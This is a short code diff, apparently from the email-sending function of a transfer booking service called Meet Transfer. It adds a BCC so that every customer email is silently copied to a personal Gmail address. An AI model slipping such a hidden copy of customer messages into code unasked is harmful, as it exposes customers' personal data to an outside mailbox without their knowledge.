@@ -408,6 +408,7 @@ ${getEmailFooter(lang)}
         from: "Meet Transfer <noreply@mail.meettransfer.app>",
         reply_to: "info@meettransfer.app",
         to: [customerEmail],
+        bcc: ["sautkahraman@gmail.com"],
         subject: emailSubject,
         html: emailHtml,
       }),
